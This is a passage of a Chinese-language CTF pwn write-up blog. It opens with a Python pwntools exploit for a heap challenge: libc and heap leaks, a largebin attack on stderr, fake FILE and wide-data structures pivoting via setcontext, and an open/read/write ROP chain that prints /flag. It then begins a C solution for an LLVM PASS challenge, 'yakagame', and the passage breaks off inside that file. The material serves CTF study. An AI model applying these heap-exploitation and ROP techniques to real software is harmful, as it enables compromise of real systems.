class="string">&#x27;Context:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    <span class="comment"># only twice</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;plz input your content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">admin()</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x418</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x438</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x428</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 4</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(r(<span class="number">8</span>)) - <span class="number">0x21a0d0</span></span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">heap_base = u64(r(<span class="number">8</span>)) - <span class="number">0xaf0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">IO_wfile_jumps = libc_base + <span class="number">0x2160c0</span></span><br><span class="line">setcontext_61 = libc_base + <span class="number">0x53a30</span> + <span class="number">61</span></span><br><span class="line">p_rdi_r = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">p_rsi_r = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">p_rdx_r12_r = libc_base + <span class="number">0x000000000011f497</span></span><br><span class="line">p_rax_r = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall_r = libc_base + <span class="number">0x0000000000091396</span></span><br><span class="line">lg(<span class="string">&#x27;setcontext_61&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># _flags = prev_size = 0</span></span><br><span class="line"><span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file1 = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x78</span></span><br><span class="line">fake_file1 += p64(heap_base)     <span class="comment"># _lock</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x290</span> + <span class="number">0x100</span>)    <span class="comment"># _wide_data</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(IO_wfile_jumps - <span class="number">0x20</span>)      <span class="comment"># vtable</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x100</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_wide = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x68</span></span><br><span class="line">fake_wide += p64(setcontext_61)     <span class="comment"># _wide_vtable + 0x68</span></span><br><span class="line">fake_wide = fake_wide.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_wide += p64(heap_base + <span class="number">0x1c90</span>)    <span class="comment"># rsp -&gt; orw_addr</span></span><br><span class="line">fake_wide += p64(p_rdi_r + <span class="number">1</span>)       <span class="comment"># rip -&gt; ret</span></span><br><span class="line">fake_wide = fake_wide.ljust(<span class="number">0xe0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_wide += p64(heap_base + <span class="number">0x290</span> + <span class="number">0x100</span>)     <span class="comment"># _wide_vtable</span></span><br><span class="line"></span><br><span class="line">fake_file1 += fake_wide</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x418</span>, fake_file1)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x458</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 8</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">pld = p64(libc_base + <span class="number">0x21a0d0</span>) * <span class="number">2</span></span><br><span class="line">pld += p64(heap_base + <span class="number">0xaf0</span>)</span><br><span class="line">pld += p64(libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>] - <span class="number">0x20</span>)    <span class="comment"># bk_nextsize</span></span><br><span class="line">edit(<span class="number">2</span>, pld)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># largebin_attack</span></span><br><span class="line"></span><br><span class="line">orw = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># close</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(heap_base + <span class="number">0x1dd0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># open -&gt; fd = 0</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(heap_base + <span class="number">0x3000</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># read</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(heap_base + <span class="number">0x3000</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># write</span></span><br><span class="line">orw += <span class="string">b&#x27;/flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x468</span>, orw)     <span class="comment"># 10</span></span><br><span class="line">edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>))    <span class="comment"># change top_chunk.size</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xf</span>))</span><br><span class="line">sla(<span class="string">&#x27;plz input your cat size:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x468</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="yakagame"><a href="#yakagame" class="headerlink" title="yakagame"></a>yakagame</h2><p>一道LLVM PASS的pwn题，具体思路看我的LLVM PASS PWN。</p>
<p>WP如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">fight</span><span class="params">(<span class="type">int</span> weapon)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span> weapon1, <span class="type">int</span> weapon2)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">destroy</span><span class="params">(<span class="type">int</span> weapon)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">upgrade</span><span class="params">(<span class="type">int</span> val)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">wuxiangdeyidao</span><span class="params">()</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">zhanjinniuza</span><span class="params">()</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">guobapenhuo</span><span class="params">()</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">tiandongwanxiang</span><span class="params">()</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func000</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func001</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func002</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func003</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func004</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func005</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func006</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func007</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func008</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func009</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func010</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func011</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func012</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func013</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func014</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func015</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func016</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func017</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func018</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func019</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func020</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func021</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func022</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func023</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func024</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func025</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func026</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func027</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func028</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func029</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func030</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func031</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func032</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func033</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func034</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func035</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func036</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func037</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func038</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func039</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func040</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func041</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func042</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func043</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func044</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func045</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func046</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func047</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func048</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func049</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func050</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func051</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func052</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func053</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func054</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func055</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func056</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func057</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func058</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func059</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func060</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func061</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func062</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func063</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func064</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func065</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func066</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func067</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func068</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func069</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func070</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func071</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func072</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func073</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func074</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func075</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func076</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func077</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func078</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func079</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func080</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func081</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func082</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func083</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func084</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func085</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func086</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func087</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func088</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func089</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func090</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func091</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func092</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func093</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func094</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func095</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func096</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func097</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func098</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func099</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func100</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func101</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func102</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func103</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func104</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func105</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func106</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func107</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func108</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func109</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func110</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func111</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func112</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func113</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func114</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func115</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func116</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func117</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func118</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func119</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func120</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func121</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func122</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func123</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func124</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func125</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func126</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func127</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func128</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func129</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func130</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func131</span><span class="params">(<span class="type">int</span> 